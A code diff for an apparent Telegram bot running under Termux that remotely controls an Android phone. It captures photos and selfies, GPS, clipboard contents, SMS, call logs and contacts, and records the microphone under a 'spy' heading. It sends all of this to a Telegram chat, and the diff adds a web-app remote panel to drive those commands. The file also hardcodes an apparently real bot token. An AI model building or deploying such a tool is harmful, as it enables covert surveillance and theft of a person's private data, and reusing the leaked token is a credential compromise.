@@ -1,9 +1,10 @@
 import telebot
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton, WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton
 import subprocess, os, json, time, signal
 
 TOKEN = '8733717882:AAHOxAckqRFA_xZG6Zppjqel_KyvbAeXgvg'
 ADMIN_ID = 6678107119
+PULT_URL = 'https://raw.githack.com/ggfix666-prog/a51-sc-control/main/prank.html'
 
 bot = telebot.TeleBot(TOKEN)
 current_process = None
@@ -13,6 +14,11 @@ def is_admin(m): return m.from_user.id == ADMIN_ID
 @bot.message_handler(func=lambda m: not is_admin(m), content_types=['text'])
 def deny(m): bot.reply_to(m, "⛔ Доступ запрещён.")
 
+def prank_kb():
+    m = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
+    m.add(KeyboardButton("🎮 Пульт", web_app=WebAppInfo(url=PULT_URL)))
+    return m
+
 @bot.message_handler(commands=['start'])
 def start(message):
     bot.reply_to(message,
@@ -21,34 +27,28 @@ def start(message):
         "/list — список треков\n"
         "/play имя — играть\n"
         "/stop — стоп\n"
-        "/volume 50 — громкость (0–100)\n\n"
+        "/volume 50 — громкость\n\n"
         "🔧 <b>СИСТЕМА</b>\n"
-        "/say текст — A51 скажет голосом\n"
+        "/say текст — голос\n"
         "/torch on|off — фонарик\n"
-        "/vibrate 5 — вибрация (сек)\n"
-        "/battery — заряд батареи\n"
-        "/photo — снимок с камеры\n"
-        "/selfie — селфи\n"
+        "/vibrate 5 — вибрация\n"
+        "/battery — батарея\n"
+        "/photo /selfie — камера\n"
         "/location — GPS\n"
-        "/clip — буфер обмена\n"
-        "/brightness 50 — яркость (0–100)\n"
+        "/clip — буфер\n"
+        "/brightness 50 — яркость\n"
         "/notify текст — уведомление\n"
-        "/device — модель и Android\n"
-        "/silent — беззвучный режим\n"
+        "/device — модель/Android\n"
+        "/silent — беззвучный\n"
         "/open ссылка — открыть сайт\n\n"
         "🕵️ <b>ШПИОН</b>\n"
-        "/sms — последние 5 SMS\n"
-        "/calls — звонки\n"
-        "/contacts — контакты\n"
-        "/record 10 — запись звука\n"
-        "/wifi — инфа о сети\n"
-        "/wifiscan — сканер WiFi\n"
-        "/toast текст — всплывашка\n\n"
+        "/sms /calls /contacts\n"
+        "/record 10 — запись\n"
+        "/wifi /wifiscan /toast\n\n"
         "🎭 <b>ПРАНК</b>\n"
-        "/prank — случайный хаос\n"
-        "/ghost — режим призрака\n"
-        "/insane — безумный телефон",
-        parse_mode='HTML')
+        "/prank /ghost /insane\n\n"
+        "Открой «🎮 Пульт» внизу 👇",
+        parse_mode='HTML', reply_markup=prank_kb())
 
 # ── МУЗЫКА ──
 MUSIC_DIR = '/sdcard/Music'
@@ -56,31 +56,26 @@ MUSIC_DIR = '/sdcard/Music'
 @bot.message_handler(commands=['list'])
 def list_cmd(message):
     if not os.path.exists(MUSIC_DIR):
-        bot.reply_to(message, "📭 Папка Music пуста"); return
+        bot.reply_to(message, "📭 Нет папки"); return
     files = sorted([f for f in os.listdir(MUSIC_DIR) if f.lower().endswith(('.mp3','.m4a','.wav','.ogg'))])
-    if not files:
-        bot.reply_to(message, "📭 Нет треков в /sdcard/Music"); return
-    txt = "🎵 Треки:\n" + "\n".join(files[:50])
-    bot.reply_to(message, txt)
+    if not files: bot.reply_to(message, "📭 Пусто"); return
+    bot.reply_to(message, "🎵 Треки:\n" + "\n".join(files[:50]))
 
 @bot.message_handler(commands=['play'])
 def play_cmd(message):
     global current_process
     fn = message.text.replace('/play','').strip()
-    if not fn:
-        bot.reply_to(message, "Напиши: /play имя_файла"); return
+    if not fn: bot.reply_to(message, "Напиши: /play имя.mp3"); return
     p = os.path.join(MUSIC_DIR, fn)
-    if not os.path.exists(p) and os.path.exists(p + '.mp3'): p += '.mp3'
-    if not os.path.exists(p):
-        bot.reply_to(message, f"❌ Не найден: {fn}"); return
+    if not os.path.exists(p) and os.path.exists(p+'.mp3'): p += '.mp3'
+    if not os.path.exists(p): bot.reply_to(message, f"❌ {fn}"); return
     if current_process and current_process.poll() is None:
         current_process.terminate()
     try:
         current_process = subprocess.Popen(["mpv","--no-video","--really-quiet",p],
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         bot.reply_to(message, f"▶️ {fn}")
-    except Exception as e:
-        bot.reply_to(message, f"Ошибка: {e}")
+    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")
 
 @bot.message_handler(commands=['stop'])
 def stop_cmd(message):
@@ -92,8 +87,7 @@ def stop_cmd(message):
 @bot.message_handler(commands=['volume'])
 def vol_cmd(message):
     p = message.text.split()
-    if len(p) < 2 or not p[1].isdigit():
-        bot.reply_to(message, "Напиши: /volume 50"); return
+    if len(p)<2 or not p[1].isdigit(): bot.reply_to(message, "Напиши: /volume 50"); return
     try:
         subprocess.run(["termux-volume","music",str(int(int(p[1])/100*15))], check=True)
         bot.reply_to(message, f"🔊 {p[1]}%")
@@ -112,7 +106,7 @@ def say_cmd(message):
 @bot.message_handler(commands=['torch'])
 def torch_cmd(message):
     p = message.text.split()
-    if len(p) < 2 or p[1].lower() not in ['on','off']:
+    if len(p)<2 or p[1].lower() not in ['on','off']:
         bot.reply_to(message, "Напиши: /torch on или /torch off"); return
     try:
         subprocess.run(["termux-torch", p[1].lower()], check=True)
@@ -122,8 +116,7 @@ def torch_cmd(message):
 @bot.message_handler(commands=['vibrate'])
 def vibrate_cmd(message):
     p = message.text.split()
-    if len(p) < 2 or not p[1].isdigit():
-        bot.reply_to(message, "Напиши: /vibrate 5"); return
+    if len(p)<2 or not p[1].isdigit(): bot.reply_to(message, "Напиши: /vibrate 5"); return
     try:
         subprocess.run(["termux-vibrate","-d",str(int(p[1])*1000)], check=True)
         bot.reply_to(message, f"📳 {p[1]} сек.")
@@ -139,8 +132,7 @@ def battery_cmd(message):
 
 @bot.message_handler(commands=['photo'])
 def photo_cmd(message):
-    bot.reply_to(message, "📸")
-    p = "/sdcard/Download/a51_photo.jpg"
+    bot.reply_to(message, "📸"); p = "/sdcard/Download/a51_photo.jpg"
     try:
         subprocess.run(["termux-camera-photo","-c","0",p], check=True, timeout=15)
         if os.path.exists(p):
@@ -150,8 +142,7 @@ def photo_cmd(message):
 
 @bot.message_handler(commands=['selfie'])
 def selfie_cmd(message):
-    bot.reply_to(message, "🤳")
-    p = "/sdcard/Download/a51_selfie.jpg"
+    bot.reply_to(message, "🤳"); p = "/sdcard/Download/a51_selfie.jpg"
     try:
         subprocess.run(["termux-camera-photo","-c","1",p], check=True, timeout=15)
         if os.path.exists(p):
@@ -179,8 +170,7 @@ def clip_cmd(message):
 @bot.message_handler(commands=['brightness'])
 def bright_cmd(message):
     p = message.text.split()
-    if len(p) < 2 or not p[1].isdigit():
-        bot.reply_to(message, "Напиши: /brightness 50"); return
+    if len(p)<2 or not p[1].isdigit(): bot.reply_to(message, "Напиши: /brightness 50"); return
     try:
         subprocess.run(["termux-brightness", str(int(int(p[1])/100*255))], check=True)
         bot.reply_to(message, f"💡 {p[1]}%")
@@ -198,16 +188,16 @@ def notify_cmd(message):
 @bot.message_handler(commands=['device'])
 def device_cmd(message):
     try:
-        model = subprocess.run(["getprop","ro.product.model"], capture_output=True, text=True).stdout.strip()
-        android = subprocess.run(["getprop","ro.build.version.release"], capture_output=True, text=True).stdout.strip()
-        bot.reply_to(message, f"📱 {model}\nAndroid: {android}")
+        m = subprocess.run(["getprop","ro.product.model"], capture_output=True, text=True).stdout.strip()
+        a = subprocess.run(["getprop","ro.build.version.release"], capture_output=True, text=True).stdout.strip()
+        bot.reply_to(message, f"📱 {m}\nAndroid: {a}")
     except Exception as e: bot.reply_to(message, f"Ошибка: {e}")
 
 @bot.message_handler(commands=['silent'])
 def silent_cmd(message):
     try:
         subprocess.run(["termux-volume","notification","0"], check=True)
-        bot.reply_to(message, "🔇 Беззвучный режим.")
+        bot.reply_to(message, "🔇 Беззвучный.")
     except Exception as e: bot.reply_to(message, f"Ошибка: {e}")
 
 @bot.message_handler(commands=['open'])
@@ -256,13 +246,13 @@ def contacts_cmd(message):
 @bot.message_handler(commands=['record'])
 def record_cmd(message):
     p = message.text.split()
-    sec = int(p[1]) if len(p) > 1 and p[1].isdigit() else 5
+    sec = int(p[1]) if len(p)>1 and p[1].isdigit() else 5
     if sec > 60: sec = 60
-    bot.reply_to(message, f"🎤 Записываю {sec} сек...")
+    bot.reply_to(message, f"🎤 {sec} сек...")
     path = "/sdcard/Download/a51_record.m4a"
     try:
         subprocess.Popen(["termux-microphone-record","-f",path,"-l",str(sec)])
-        time.sleep(sec + 2)
+        time.sleep(sec+2)
         subprocess.run(["termux-microphone-record","-q"], check=True)
         if os.path.exists(path):
             with open(path,'rb') as f: bot.send_voice(message.chat.id, f)
@@ -343,6 +333,51 @@ def insane_cmd(message):
         subprocess.run(["termux-tts-speak","Я сошёл с ума. Ха-ха-ха."])
         bot.reply_to(message, "Закончилось.")
     except Exception as e: bot.reply_to(message, f"Ошибка: {e}")
+
+# ═══════════════════════════════════════════
+#  ОБРАБОТЧИК WEB APP (от prank.html)
+# ═══════════════════════════════════════════
+@bot.message_handler(content_types=['web_app_data'])
+def handle_webapp(message):
+    raw = message.web_app_data.data.strip()
+    print(f"[WEBAPP] {raw[:80]}")
+    # Формат команд: "/torch on", "/say Привет", "/photo" и т.д.
+    # Просто передаём в обработчик соответствующей команды.
+    fake = message
+    fake.text = raw
+    cmd = raw.split()[0] if raw else ""
+    try:
+        if cmd == '/torch': torch_cmd(fake)
+        elif cmd == '/say': say_cmd(fake)
+        elif cmd == '/vibrate': vibrate_cmd(fake)
+        elif cmd == '/battery': battery_cmd(fake)
+        elif cmd == '/photo': photo_cmd(fake)
+        elif cmd == '/selfie': selfie_cmd(fake)
+        elif cmd == '/location': loc_cmd(fake)
+        elif cmd == '/clip': clip_cmd(fake)
+        elif cmd == '/brightness': bright_cmd(fake)
+        elif cmd == '/notify': notify_cmd(fake)
+        elif cmd == '/device': device_cmd(fake)
+        elif cmd == '/silent': silent_cmd(fake)
+        elif cmd == '/open': open_cmd(fake)
+        elif cmd == '/sms': sms_cmd(fake)
+        elif cmd == '/calls': calls_cmd(fake)
+        elif cmd == '/contacts': contacts_cmd(fake)
+        elif cmd == '/record': record_cmd(fake)
+        elif cmd == '/wifi': wifi_cmd(fake)
+        elif cmd == '/wifiscan': wifiscan_cmd(fake)
+        elif cmd == '/toast': toast_cmd(fake)
+        elif cmd == '/prank': prank_cmd(fake)
+        elif cmd == '/ghost': ghost_cmd(fake)
+        elif cmd == '/insane': insane_cmd(fake)
+        elif cmd == '/list': list_cmd(fake)
+        elif cmd == '/play': play_cmd(fake)
+        elif cmd == '/stop': stop_cmd(fake)
+        elif cmd == '/volume': vol_cmd(fake)
+        else: bot.send_message(message.chat.id, f"❓ {raw[:40]}")
+    except Exception as e:
+        print(f"[WEBAPP] ERROR: {e}")
+        bot.send_message(message.chat.id, f"❌ {e}")
 
 print("A51 Control Bot запущен...")
 bot.polling(none_stop=True)
